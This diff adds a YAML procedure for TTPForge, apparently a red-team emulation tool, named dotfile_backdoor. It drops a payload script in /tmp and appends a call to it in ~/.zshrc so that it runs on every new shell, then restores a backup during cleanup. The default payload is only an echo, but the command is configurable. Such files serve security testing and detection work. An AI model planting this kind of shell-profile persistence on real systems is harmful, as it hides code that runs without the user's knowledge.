@@ -1,0 +1,57 @@
+---
+name: dotfile_backdoor
+description: |
+  This TTP demonstrates the core features of TTPForge:
+    - Various Attacker Actions Implemented as Executable YAML
+    - Simple but powerful Command-line Argument Support
+    - Last-in-First-Out Cleanup Execution
+    - Checking Conditions at Runtime to Avoid Errors
+args:
+  - name: target_file_path
+    description: The file that we should try to backdoor
+    default: ~/.zshrc
+  - name: payload_file_path
+    description: |
+      The path to which we should write the payload file.
+      The backdoor we insert into the target file will reference this
+      payload.
+    default: /tmp/ttpforge-dotfile-backdoor-demo-payload.sh
+  - name: payload_cmd
+    description: |
+      The shell command that our payload should execute
+    default: echo 'Hello from TTPForge! You have been pwned!'
+  - name: backup_file_path
+    description: |
+      The file path to which the target file should be backed up
+    default: /tmp/ttpforge-dotfile-backdoor-backup
+steps:
+  - name: verify_dotfile_exists
+    description: |
+      Uses the `checks:` feature to verify that the target file
+      actually exists before we try to write to it
+    print_str: |
+      Verifying that {{.Args.target_file_path}} exists...
+    checks:
+      - path_exists: {{.Args.target_file_path}}
+        msg: "Target file {{.Args.target_file_path}} must exist"
+  - name: create_payload_file
+    description: |
+      This step uses the `create_file:` action to drop our payload to disk
+    create_file: {{.Args.payload_file_path}}
+    contents: |
+      #!/bin/bash
+      # Created by TTPForge
+      {{.Args.payload_cmd}}
+    mode: 0755
+    cleanup: default
+  - name: backdoor_target_file
+    edit_file: {{.Args.target_file_path}}
+    backup_file: {{.Args.backup_file_path}}
+    edits:
+      - append: |
+          # ADDED BY TTPFORGE - SHOULD BE CLEANED UP AUTOMATICALLY
+          # BUT IF NOT YOU CAN DELETE THIS :)
+          {{.Args.payload_file_path}}
+    cleanup:
+      inline: |
+        cp {{.Args.backup_file_path}} {{.Args.target_file_path}}
